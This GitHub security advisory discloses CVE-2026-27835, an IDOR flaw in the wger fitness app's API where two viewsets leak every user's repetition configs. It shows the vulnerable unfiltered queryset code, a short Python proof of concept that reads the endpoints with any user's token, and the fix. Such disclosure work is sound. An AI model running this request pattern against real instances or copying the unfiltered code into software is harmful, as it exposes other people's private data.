# [M] wger: IDOR in RepetitionsConfig and MaxRepetitionsConfig API leak other users' workout data

## Summary
Severity: Medium
Advisory: GHSA-xf68-8hjw-7mpm
CVE: CVE-2026-27835
CWE: CWE-639
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-02-26
Source: https://github.com/advisories/GHSA-xf68-8hjw-7mpm
Type: github-advisory

## Affected
- PyPI: `wger` — affected >=0

## Details
### Summary

`RepetitionsConfigViewSet` and `MaxRepetitionsConfigViewSet` return all users' repetition config data because their `get_queryset()` calls `.all()` instead of filtering by the authenticated user. Any registered user can enumerate every other user's workout structure.

### Details

`wger/manager/api/views.py:499` and `:518`:

```python
# VULNERABLE
class RepetitionsConfigViewSet(viewsets.ModelViewSet):
    def get_queryset(self):
        return RepetitionsConfig.objects.all()

class MaxRepetitionsConfigViewSet(viewsets.ModelViewSet):
    def get_queryset(self):
        return MaxRepetitionsConfig.objects.all()
```

Every sibling viewset in the same file correctly filters by user. For example, `WeightConfigViewSet` at line 459:

```python
# CORRECT — how it should work
def get_queryset(self):
    return WeightConfig.objects.filter(
        slot_entry__slot__day__routine__user=self.request.user
    )
```

The same user filter is present on `SetsConfig`, `RestConfig`, `RiRConfig`, and their Max variants — only `RepetitionsConfig` and `MaxRepetitionsConfig` are missing it.

### PoC

```python
import requests

BASE = "http://localhost"
headers = {"Authorization": "Token YOUR_TOKEN"}  # any registered user

r = requests.get(f"{BASE}/api/v2/repetitions-config/", headers=headers)
print(r.json())  # returns ALL users' repetition configs, not just your own

r = requests.get(f"{BASE}/api/v2/max-repetitions-config/", headers=headers)
print(r.json())  # same — all users' max repetition configs
```

Registration is open by default. Sequential IDs allow full enumeration.

### Impact

Any authenticated user can read other users' repetition and max-repetitions configs, exposing workout structure (slot entry IDs, iteration values, operations, step counts, repeat flags, requirements JSON). This is a broken object-level authorization (BOLA/IDOR) vulnerability — the same class of issue as OWASP API1.

**Fix**: Add the same user filter used by every other config viewset:
```python
def get_queryset(self):
    return RepetitionsConfig.objects.filter(
        slot_entry__slot__day__routine__user=self.request.user
    )
```

## References
- https://github.com/wger-project/wger/security/advisories/GHSA-xf68-8hjw-7mpm
- https://nvd.nist.gov/vuln/detail/CVE-2026-27835
- https://github.com/wger-project/wger/commit/1fda5690b35706bb137850c8a084ec6a13317b64
- https://github.com/wger-project/wger
